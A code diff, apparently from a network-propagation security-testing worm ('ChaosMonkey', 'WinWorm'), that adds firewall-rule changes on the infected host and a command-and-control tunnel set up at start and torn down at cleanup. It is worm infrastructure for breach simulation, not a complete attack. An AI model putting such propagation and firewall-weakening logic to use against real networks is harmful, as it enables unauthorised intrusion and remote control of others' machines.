@@ -4,9 +4,11 @@ import time
 import logging
 import platform
 from system_singleton import SystemSingleton
+from network.firewall import app as firewall
 from control import ControlClient
 from config import WormConfiguration, EXTERNAL_CONFIG_FILE
 from network.network_scanner import NetworkScanner
+import tunnel
 import getopt
 
 __author__ = 'itamar'
@@ -46,15 +48,19 @@ class ChaosMonkey(object):
         self._keep_running = True
         self._network = NetworkScanner()
         self._dropper_path = sys.argv[0]
-        self._os_type = platform.system().lower()
-        self._machine = platform.machine().lower()
-
-        ControlClient.wakeup(self._parent)
-        ControlClient.load_control_config()
 
 
     def start(self):
         LOG.info("WinWorm is running...")
+
+        if firewall.is_enabled():
+            firewall.add_firewall_rule()
+
+        ControlClient.wakeup(self._parent)
+        
+        monkey_tunnel = ControlClient.create_control_tunnel()
+        if monkey_tunnel:
+            monkey_tunnel.start()
 
         for _ in xrange(WormConfiguration.max_iterations):
             ControlClient.keepalive()
@@ -136,7 +142,18 @@ class ChaosMonkey(object):
         if self._keep_running:
             LOG.info("Reached max iterations (%d)", WormConfiguration.max_iterations)
 
+        if monkey_tunnel:
+            monkey_tunnel.stop()
+            monkey_tunnel.join()
+
     def cleanup(self):
         self._keep_running = False
 
         self._singleton.unlock()
+
+        tunnel_address = ControlClient.proxies.get('https', '').replace('https://', '').split(':')[0]
+        if tunnel_address:
+            LOG.info("Quitting tunnel %s", tunnel_address)
+            tunnel.quit_tunnel(tunnel_address)
+
+        firewall.close()
